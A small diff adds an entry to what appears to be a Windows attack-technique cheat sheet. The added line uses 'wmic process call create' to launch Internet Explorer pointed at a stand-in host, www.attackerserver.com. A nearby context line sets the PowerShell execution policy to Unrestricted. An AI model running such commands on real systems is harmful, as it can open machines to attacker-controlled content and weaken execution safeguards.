@@ -174,3 +174,6 @@
 * ensure and check your powershell execution policy with cmdlet
 -> Set-ExecutionPolicy AllSigned | RemoteSigned | Unrestricted
 
+* wmic open file or url 
+-> wmic process call create "C:\Program Files\Internet Explorer\iexplore.exe www.attackerserver.com"
+
